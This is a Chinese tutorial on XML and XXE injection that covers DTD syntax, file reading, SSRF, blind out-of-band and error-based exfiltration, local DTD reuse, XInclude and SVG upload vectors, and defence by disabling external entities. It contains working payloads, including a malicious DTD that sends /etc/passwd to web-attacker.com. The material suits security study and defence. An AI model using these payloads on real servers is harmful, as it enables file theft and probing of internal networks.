# 一.XML 基础知识

# 1.XML 语法

一个 XML 实例：

第一行是 XML 声明，它定义 XML 的版本 (1.0) 和所使用的编码，第二行 <note> 是根元素，其余都是子元素。

  • 所有 XML 元素都必须有关闭标签

  • XML 标签对大小写敏感

  • XML 必须都正确地嵌套

  • XML 文档必须有根元素

  • XML 的属性值必须加引号 (XML 属性为键值对)

  • XML 注释为 <!--this is comment-->

  • XML 中多个空格会被保留，而 HTML 会把多个空格合并为一个

  • XML 以 LF 存储换行，Windows 换行用 CR (回车符) 和 LF (换行符)，Unix 用 LF 换行

  • 实体引用

在 XML 中，一些字符有特殊含义，应该使用实体引用来代替这些字符。只有 “<” 和 “&” 是非法的，大于号是合法的，但是应尽量使用实体引用。

# 2.DTD

DTD - 文档类型定义的作用是定义 XML 文档的合法构建模块，使用一系列的合法元素来定义文档结构，每个 XML 文件均可携带一个关于自身格式的描述。

a.DTD 可被成行地声明于 XML 文档中，也可以作为一个外部引用。

内部 DTD： <!DOCTYPE 根元素 [元素声明]>

外部 DTD： <!DOCTYPE 根元素 SYSTEM "文件名">

note.dtd 文件：

<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>

b.DTD 元素

在 DTD 中元素通过元素声明进行。

  • 声明一个元素， <!ELEMENT 元素名 (元素内容)>

  • 空元素， <!ELEMENT 元素名 EMPTY>

  • 带有任何内容的元素， <!ELEMENT 元素名 ANY>

  • 带有子元素的元素， <!ELEMENT 元素名 (子元素名称 1,子元素名称 2,.....)>

c. 实体声明

实体是用于定义普通文本或特殊字符的快捷方式的变量。

内部实体声明： <!ENTITY 实体名称 "实体值"> , 引用方法：& 实体名称；

外部实体声明： <!ENTITY 实体名称 SYSTEM "URL/URI">

参数实体声明： <!ENTITY % 实体名称 "实体名称"> ，参数实体只能在 DTD 部分引用，引用方法：% 实体名称；，另外参数实体还能嵌套定义，但是要注意内层定义的参数实体 % 需要进行 HTML 转义，否则会出现解析错误.

# 二.XXE

外部实体注入是由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体，导致读取任意文件、执行操作系统命令、探测内网端口、攻击内网网址等后果，根本原因是 XML 规范包含各种潜在的危险特性，标准解析器 (解析操作几乎使用标准库或平台 API) 支持这些特性，即使它们通常不被应用程序使用。

# 1. 读取任意文件

要执行从服务器读取任意文件的 XXE 注入，需两种方式修改提交的 XML：

  • 引入或编辑一个 DOCTYPE 元素，该元素定义包含文件路径的外部实体。
  • 编辑应用程序响应中返回的 XML 中的数据值，以使用定义的外部实体。

真实的 XXE 漏洞会提交大量数据值，任何一个都可能在应用程序中响应，通常需要单独测试 XML 中的每个节点，方法是使用自定义的实体并查看它是否出现在响应中。

# 2.XXE 完成 SSRF

要利用 XXE 完成 SSRF 需要使用要请求的 URL 定义外部 XML 实体，并在数据值中引用实体。如果能在应用程序响应中返回数据值中引用定义的实体，则可以和后端系统交互，否则只能执行盲 SSRF 攻击。

以下外部实体导致服务器向内网系统发出 HTTP 请求：

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

# 3. 盲 XXE

# a.OAST 探测盲 XXE

除了使用常规实体之外，还可以使用参数实体进行注入，参数实体同常规实体的区别就是：在声明和引用参数实体时，参数实体前都要加 %，而且参数实体只能在 DTD 部分引用。

声明： <!ENTITY % xxe "my parameter entity value" >

引用： <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

外带数据：

  • 在自己的 web 服务器上存放一个恶意 DTD， http://web-attacker.com/malicious.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

引用 eval 实体会加载 exfiltrate 实体读取出 /etc/passwd 内容，引用 exfiltrate 实体会携带 /etc/passwd 数据访问 VPS。

  • 提交一个 xxe payload 应用自己服务器上的恶意 DTD
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>

由于一些 XML 解析器使用 API 来获取外部实体定义中的字符，可能 HTTP 协议会被禁止，只能使用 FTP，所以这种方法可能无法读出 /etc/passwd 中的换行符，导致数据无实际意义，但是可以读取 /etc/hostname 这些文件。

# b.XXE 报错携带数据

  • 在自己的 web 服务器上存放恶意 DTD
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

该 DTD 执行以下步骤：

定义一个名为 file 的 XML 参数实体，包含文件 /etc/passwd 的内容

定义一个名为 eval 的 XML 参数实体，其中包含另一个名为 error 的 XML 参数实体的动态声明，将通过加载包含文件实体值不存在的文件来实体化。

使用 eval 实体，导致执行错误实体的动态声明。

使用错误实体，以便加载不存在的文件来实体化，从而导致错误消息包含不存在文件的内容。

# c. 利用本地 DTD

在另一个参数实体中使用 XML 参数实体，根据 XML 规范，这在外部 DTD 中是允许的 ，但是内部 DTD 不允许，在无法进行带外交互时，就无法带外连接泄露数据，也不能从远程服务器加载外部 DTD。但是由于 XML 规范中的漏洞，如果文档的 DTD 混合使用内部和外部 DTD 声明，则内部 DTD 可以重新定义在外部 DTD 中声明的实体，这是就可以在另外一个参数实体的定义中使用参数实体。

假设被攻击服务器存在一个 DTD 文件 /usr/local/app/schema.dtd , 该文件定义了一个参数实体 custom_entity ，那么就可以通过触发报错读取文件：

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

包含 DTD 文件的常见系统都是开源的，可以简单枚举文件名，再通过 Google 找到存在的 DTD 文件副本。

# 4.XInclude 攻击

xinclude 语法

xinclude 语法简单，在命名空间 http://www.w3.org/2003/XInclude 中的两个元素， include和fallback ，常用的命名空间的前缀是 xi，可以随意更改。

xi:include 元素

该元素中的几个属性：

  • href — 对要包括的文档的 URI 引用。

  • parse — 它的值可以是 “xml” 或 “text”，用于定义如何包括指定的文档（是作为 XML 还是作为纯文本）。默认值是 “xml”。

  • xpointer — 这是一个 XPointer，用于标识要包括的 XML 文档部分。如果作为文本包括 (parse=”text”)，将忽略该属性。

  • encoding — 作为文本包括时，该属性提供所包括文档的编码提示信息。

<xi:include href="test.xml" parse="text"/>

一些应用程序接受客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档，这种情况下无法控制整个 XML 文档，无法定义或修改 DOCTYPE 元素，而 XInclude 允许从子文档构建 XML 文档，可以在可服务端 XML 文档可控制的单个数据项执行攻击。

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

# 5. 文件上传实现 XXE

基于 XML 格式的文件有 DOCX 和 SVG 等，应用程序允许用户上传图像，并且在后台处理或验证这些图像，即使这些应用程序希望接受 PNG 或 JPEG 这样的格式，但是正在使用的图像处理库也可能支持 SVG 图像，所以攻击者就可以提交恶意 SVG 图像，从而达到 XXE。

# 6. 修改 HTTP 头中的内容类型实现 XXE

一般网站都默认使用 Content-Type:application/x-www-form-urlencoded , 但是也可以接受其他类型， Content-Type: text/xml ,

如果应用接受该请求并将 body 的内容当作 XML 解析，则可以完成 XXE。

# 三.xxe 的发现和防御

# 1. 探测 xxe

最快的方法是使用 Burp

  • 通过定义实体来读取众所周知的操作系统文件
  • 带外交互测试盲 xxe
  • 通过 XInclude 攻击读取众所周知的操作系统文件

# 2. 防御 xxe

几乎所有 XXE 漏洞都是因为应用程序的 XML 解析库支持因应用程序不需要或不打算使用潜在危险 XML 功能，防止 xxe 最简单方法就是禁用这些功能，通常禁用外部实体的解析并禁用 XInclude 的支持，可以通过配置选项或以编程方式覆盖默认行为来实现，具体的禁用方法参考 XML 解析库或 API 文档。
